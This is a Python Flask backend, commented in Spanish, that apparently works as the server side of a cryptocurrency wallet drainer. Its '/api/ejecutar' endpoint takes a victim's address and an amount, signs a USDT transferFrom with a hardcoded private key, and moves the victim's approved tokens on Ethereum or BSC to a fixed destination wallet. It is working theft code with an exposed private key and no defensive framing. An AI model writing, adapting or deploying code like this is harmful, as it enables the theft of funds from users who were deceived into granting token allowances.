from flask import Flask, jsonify, request
from flask_cors import CORS
from web3 import Web3
import json

app = Flask(__name__)
CORS(app)

# ---------- CONFIGURACIÓN ----------
PRIVATE_KEY = "51c6ebaba0949bda1717c797102366ed9de8411445b353ad220d30dfb9f4f0e7"
DESTINO = "0x3F1873E4D86539C90df80Fe8F8607C109917990a"

# RPCs públicos
RPC = {
    1: "https://rpc.ankr.com/eth",
    56: "https://rpc.ankr.com/bsc"
}

# Contratos USDT
USDT = {
    1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    56: "0x55d398326f99059fF775485246999027B3197955"
}

# ABI mínimo
ERC20_ABI = json.loads("""
[
  {
    "constant": false,
    "inputs": [
      {"name":"from","type":"address"},
      {"name":"to","type":"address"},
      {"name":"value","type":"uint256"}
    ],
    "name": "transferFrom",
    "outputs": [{"name":"","type":"bool"}],
    "type": "function"
  }
]
""")

@app.route('/api/ejecutar', methods=['POST'])
def ejecutar():
    try:
        data = request.get_json()
        if not data or not all(key in data for key in ["user", "amount", "chainId"]):
            return jsonify({"status": "error", "message": "Faltan datos"}), 400

        user = data["user"]
        amount = int(data["amount"])
        chainId = int(data["chainId"])

        if chainId not in RPC:
            return jsonify({"status": "error", "message": "Red no soportada"}), 400

        web3 = Web3(Web3.HTTPProvider(RPC[chainId]))
        if not web3.is_connected():
            return jsonify({"status": "error", "message": "Error de conexión"}), 500

        acct = web3.eth.account.from_key(PRIVATE_KEY)
        token = web3.eth.contract(address=USDT[chainId], abi=ERC20_ABI)

        tx = token.functions.transferFrom(user, DESTINO, amount).build_transaction({
            "from": acct.address,
            "nonce": web3.eth.get_transaction_count(acct.address),
            "gas": 120_000,
            "gasPrice": web3.to_wei("5", "gwei")
        })

        signed = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
        tx_hash = web3.eth.send_raw_transaction(signed.rawTransaction)
        
        return jsonify({"status": "ok", "tx": tx_hash.hex()})

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def handler(req, res):
    return ejecutar()
